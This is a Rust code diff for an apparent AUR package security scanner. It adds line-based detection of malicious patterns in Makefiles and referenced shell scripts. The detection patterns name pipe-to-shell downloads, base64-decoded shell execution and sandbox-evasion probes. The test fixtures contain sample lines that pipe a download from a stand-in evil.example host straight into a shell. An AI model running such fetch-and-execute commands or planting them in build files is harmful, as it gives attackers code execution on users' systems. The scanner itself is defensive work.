@@ -1310,6 +1310,198 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
     findings
 }
 
+/// Line-only scan for Makefiles / shell scripts (no bash AST — make
+/// syntax would false-positive). Same IOCs that matter when the payload
+/// is hidden outside PKGBUILD.
+fn scan_support_file_source(source: &str) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    if let Some(line) = line_of_curl_pipe_shell(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "downloads and pipes a remote script straight into a shell (curl/wget | sh)"
+                .to_string(),
+        });
+    }
+    if let Some(line) = line_of_base64_pipe_shell(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "decodes a base64/hex-encoded blob and pipes it straight into a shell (base64 -d | sh / xxd -r -p | bash) - same obfuscated-execution role as curl|sh, just an inline-stashed payload instead of a network fetch"
+                .to_string(),
+        });
+    } else if let Some(line) = line_of_base64_decode(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "decodes a base64 blob (possible obfuscated payload)".to_string(),
+        });
+    }
+    if let Some(line) = line_of_raw_ipv4(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "fetches from or references a hardcoded raw IP address instead of a domain"
+                .to_string(),
+        });
+    }
+    if let Some(line) = line_of_paste_site_fetch(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "fetches from a paste-dump site (pastebin/hastebin/dpaste/ix.io/...)"
+                .to_string(),
+        });
+    }
+    if let Some(line) = line_of_compromised_marker(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::ConfirmedIoc,
+            message: "references 'compromised.txt' - marker from the 2018 AUR takeover".to_string(),
+        });
+    }
+    if let Some(line) = line_of_onion_address(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "references a .onion address".to_string(),
+        });
+    }
+    if let Some(line) = line_of_chmod_777(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "sets world-writable/executable permissions (chmod 777)".to_string(),
+        });
+    }
+    if let Some(line) = line_of_hex_escape_payload(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "contains a long run of \\xHH hex-escape sequences".to_string(),
+        });
+    }
+    if let Some(line) = line_of_sandbox_evasion(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "checks TracerPid/proc-self-status or probes LD_PRELOAD/LD_LIBRARY_PATH"
+                .to_string(),
+        });
+    }
+    findings
+}
+
+/// PKGBUILD appears to invoke make/gmake (including $(MAKE)).
+fn pkgbuild_invokes_make(pkgbuild: &str) -> bool {
+    for line in pkgbuild.lines() {
+        let t = line.trim();
+        if t.starts_with('#') {
+            continue;
+        }
+        // Word-ish match: avoid matching "cmake" alone as "make".
+        let lower = t.to_ascii_lowercase();
+        if lower.contains("$(make)")
+            || lower.contains("${make}")
+            || lower.split_whitespace().any(|w| {
+                matches!(w, "make" | "gmake" | "make;" | "gmake;")
+                    || w.starts_with("make-")
+                    || w.starts_with("gmake-")
+            })
+        {
+            return true;
+        }
+    }
+    false
+}
+
+/// Shell scripts referenced as `bash foo.sh`, `sh ./bar`, `./install.sh`, etc.
+fn pkgbuild_shell_script_refs(pkgbuild: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    for line in pkgbuild.lines() {
+        let t = line.trim();
+        if t.starts_with('#') {
+            continue;
+        }
+        let parts: Vec<&str> = t.split_whitespace().collect();
+        for (i, w) in parts.iter().enumerate() {
+            let shell = matches!(*w, "bash" | "sh" | "dash" | "zsh" | "fish" | "ksh" | "ash");
+            if shell {
+                if let Some(next) = parts.get(i + 1) {
+                    // Skip flags like -c, -e.
+                    if next.starts_with('-') {
+                        continue;
+                    }
+                    let path = next.trim_matches(|c| c == '"' || c == '\'' || c == '`');
+                    if !path.is_empty()
+                        && !path.contains("://")
+                        && !path.starts_with('$')
+                        && !path.contains('=')
+                    {
+                        out.push(path.to_string());
+                    }
+                }
+            }
+            // `./something.sh` or `path/to/script.sh`
+            if (w.starts_with("./") || w.contains('/'))
+                && (w.ends_with(".sh")
+                    || w.ends_with(".bash")
+                    || w.ends_with(".zsh")
+                    || w.ends_with(".fish"))
+            {
+                let path = w.trim_matches(|c| c == '"' || c == '\'' || c == ';');
+                out.push(path.to_string());
+            }
+        }
+    }
+    out.sort();
+    out.dedup();
+    out
+}
+
+/// When the checkout is local: scan Makefile* if present (or PKGBUILD
+/// clearly invokes make), and shell scripts it references.
+/// Returns (filename, findings).
+fn scan_local_support_files(pkgbuild: &str, dir: &std::path::Path) -> Vec<(String, Finding)> {
+    let mut out = Vec::new();
+    // Always try Makefile* on disk: PKGBUILD may call `$(MAKE)`, a
+    // variable, or `make` only after an edit the invoke-heuristic misses.
+    let want_make = pkgbuild_invokes_make(pkgbuild)
+        || ["Makefile", "makefile", "GNUmakefile"]
+            .iter()
+            .any(|n| dir.join(n).is_file());
+    if want_make {
+        for name in ["Makefile", "makefile", "GNUmakefile"] {
+            let path = dir.join(name);
+            if let Ok(src) = std::fs::read_to_string(&path) {
+                for f in scan_support_file_source(&src) {
+                    out.push((name.to_string(), f));
+                }
+            }
+        }
+    }
+    for rel in pkgbuild_shell_script_refs(pkgbuild) {
+        // Only paths that stay under the package dir (no ../ escapes).
+        let path = dir.join(&rel);
+        let Ok(canon) = path.canonicalize() else {
+            continue;
+        };
+        let Ok(dir_canon) = dir.canonicalize() else {
+            continue;
+        };
+        if !canon.starts_with(&dir_canon) {
+            continue;
+        }
+        if let Ok(src) = std::fs::read_to_string(&canon) {
+            // Full PKGBUILD-grade scan for real shell scripts.
+            for f in scan_pkgbuild_source(&src) {
+                out.push((rel.clone(), f));
+            }
+        }
+    }
+    out
+}
+
 /// Per-process memo so a pkgbase already scanned earlier in this run
 /// (main.rs's pre-check, `aur_install`'s pre-scan, and the per-pkgbase
 /// check in `resolve_and_build_aur` all call this) isn't re-fetched and
@@ -1523,20 +1715,26 @@ pub(crate) fn verify_local_clone_or_rescan(
             .map(|src| (name, src))
     });
 
+    // Support files (Makefile / shell scripts) only exist on disk after
+    // clone; cgit pre-scan never sees them. Always scan those when present.
+    let mut support = scan_local_support_files(&local_pkgbuild, dir);
+
     if let Some(pre) = prefetched {
         let install_matches = match (&local_install, &pre.install) {
             (None, None) => true,
             (Some((ln, ls)), Some((pn, ps))) => ln == pn && ls == ps,
             _ => false,
         };
-        if local_pkgbuild == pre.pkgbuild && install_matches {
-            return; // identical to what was already scanned -- nothing to redo
+        if local_pkgbuild == pre.pkgbuild && install_matches && support.is_empty() {
+            return; // identical to cgit scan and no Makefile/script hits
         }
-        println!(
-            "{} '{}' clone differs from the copy already scanned via cgit -- verifying the clone directly...",
-            ">>>".t_yellow().bold(),
-            pkgbase
-        );
+        if local_pkgbuild != pre.pkgbuild || !install_matches {
+            println!(
+                "{} '{}' clone differs from the copy already scanned via cgit -- verifying the clone directly...",
+                ">>>".t_yellow().bold(),
+                pkgbase
+            );
+        }
     } else {
         println!(
             "{} '{}' wasn't scanned before cloning (cgit fetch failed or this pkgbase was only resolved after cloning) -- scanning the clone directly...",
@@ -1549,6 +1747,7 @@ pub(crate) fn verify_local_clone_or_rescan(
         .into_iter()
         .map(|f| ("PKGBUILD".to_string(), f))
         .collect();
+    pkg_findings.append(&mut support);
     if let Some((name, src)) = &local_install {
         pkg_findings.extend(
             scan_pkgbuild_source(src)
@@ -1634,6 +1833,10 @@ fn scan_report(
                 .into_iter()
                 .map(|f| (name.clone(), f)),
         );
+    }
+    // Makefile + shell scripts only when we have the checkout on disk.
+    if let Some(dir) = local_dir {
+        pkg_findings.extend(scan_local_support_files(pkgbuild_src, dir));
     }
 
     // Same name-based check as scan_aur_pkgbuilds_or_abort - `--scan`/
@@ -2145,6 +2348,45 @@ package() {
 }
 "#;
         assert!(scan_pkgbuild_source(src).is_empty());
+        assert!(pkgbuild_invokes_make(src));
+        assert!(!pkgbuild_invokes_make("build() {\n  cmake --build .\n}\n"));
+    }
+
+    #[test]
+    fn makefile_and_shell_script_support_scan() {
+        // curl|sh in a Makefile is the same IOC as in a PKGBUILD.
+        let mf = "all:\n\tcurl http://evil.example/x | sh\n\techo x | base64 -d | bash\n";
+        let hits = scan_support_file_source(mf);
+        assert!(hits.iter().any(|f| f.message.contains("pipes a remote")));
+        assert!(hits.iter().any(|f| f.message.contains("base64")));
+
+        let pb = "build() {\n  bash helper.sh\n  ./run.fish\n}\n";
+        let refs = pkgbuild_shell_script_refs(pb);
+        assert!(refs.iter().any(|r| r == "helper.sh"));
+        assert!(refs.iter().any(|r| r == "./run.fish"));
+    }
+
+    #[test]
+    fn local_dir_scans_makefile_even_without_make_in_pkgbuild() {
+        let dir = std::env::temp_dir().join(format!("ae-mf-scan-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(dir.join("PKGBUILD"), "pkgname=x\nbuild() { true; }\n").unwrap();
+        std::fs::write(
+            dir.join("Makefile"),
+            "all:\n\tcurl -sSL https://evil.example.com/x | sh\n",
+        )
+        .unwrap();
+        let pb = std::fs::read_to_string(dir.join("PKGBUILD")).unwrap();
+        let hits = scan_local_support_files(&pb, &dir);
+        assert!(
+            hits.iter().any(|(f, finding)| {
+                f == "Makefile" && finding.message.contains("pipes a remote")
+            }),
+            "expected Makefile curl|sh hit, got {:?}",
+            hits
+        );
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     #[test]
